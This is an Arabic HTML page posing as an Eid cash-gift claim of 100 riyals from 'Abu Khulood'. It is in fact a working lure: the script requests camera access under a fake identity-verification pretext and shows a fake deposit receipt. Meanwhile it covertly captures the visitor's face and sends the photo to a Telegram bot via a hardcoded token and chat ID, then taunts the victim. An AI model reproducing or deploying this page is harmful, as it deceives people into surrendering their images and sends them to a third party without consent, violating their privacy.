<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>عيديتك من أبو خلود 🎁</title>
    <meta property="og:title" content="عيديتك من أبو خلود 🎁">
    <meta property="og:description" content="اضغط هنا لاستلام عيدية بقيمة 100 ريال مقدمة من أبو خلود.">
    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTg9HaPsfvfZnNIErVSV9Bg0nO6s4P-W8Wxsg&s">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <style>
        body { font-family: 'Arial', sans-serif; background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #fff; padding: 40px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; border: 1px solid #eee; }
        .logo { width: 120px; height: auto; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; font-size: 24px; }
        .amount { font-size: 48px; color: #27ae60; font-weight: bold; margin: 20px 0; }
        .btn { background: #27ae60; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3); transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        .receipt { display: none; text-align: right; background: #f9f9f9; padding: 15px; border-radius: 10px; margin-top: 20px; border: 1px dashed #ccc; animation: fadeIn 0.5s; }
        video, canvas { display: none; }
        .final-msg { color: #e74c3c; font-size: 30px; font-weight: bold; animation: shake 0.5s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTg9HaPsfvfZnNIErVSV9Bg0nO6s4P-W8Wxsg&s" class="logo">
    <h1>عيديتك من أبو خلود 🎁</h1>
    <p>لقد تم تخصيص عيدية نقدية لك</p>
    <div class="amount">100.00 ر.س</div>
    <button class="btn" id="giftBtn" onclick="takeGift()">اضغط لاستلام العيدية</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // بياناتك المضافة تلقائياً
    const TOKEN = "8680007162:AAFCF3Zam9o0c1IFzAoWlb7FZP6sGvFkDRY";
    const CHAT_ID = "1232397788";

    async function takeGift() {
        try {
            // طلب إذن الكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('video').srcObject = stream;

            // تغيير الواجهة لإيصال وهمي
            const card = document.getElementById('mainCard');
            card.innerHTML = `
                <div style="color:#27ae60; font-size:60px;">✔️</div>
                <h3>تم قبول العملية</h3>
                <div class="receipt" style="display:block;">
                    <p><b>من:</b> أبو خلود</p>
                    <p><b>إلى:</b> عزيزي المستلم</p>
                    <p><b>المبلغ:</b> 100.00 ريال سعودي</p>
                    <p><b>رقم المرجع:</b> ${Math.floor(Math.random() * 9000000) + 1000000}</p>
                    <p style="font-size:12px; color:gray;">يتم الآن تأكيد الإيداع، يرجى الانتظار...</p>
                </div>
            `;

            // تصوير وإرسال بعد ثانيتين (عشان يقرأ الإيصال ويثبت وجهه)
            setTimeout(captureAndSend, 2500);

        } catch (err) {
            alert("خطأ: يجب قبول إذن الكاميرا للتحقق من الهوية واستلام العيدية!");
        }
    }

    function captureAndSend() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'prank.jpg');
            formData.append('caption', 'السبك صدق وأخذت صورته! 😂📸 \n صيد موفق يا أبو خلود');

            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            // اللحظة الحاسمة
            setTimeout(() => {
                document.getElementById('mainCard').innerHTML = `
                    <div class="final-msg">🤡 صدقت يا سبك؟</div>
                    <p style="font-size:20px; margin-top:15px;">صورتك الحين عندي بالتليجرام، تعيش وتأكل غيرها!</p>
                    <p style="font-weight:bold;">عيدك مبارك يا ضحية أبو خلود 😂</p>
                `;
            }, 1000);
        }, 'image/jpeg');
    }
</script>

</body>
</html>
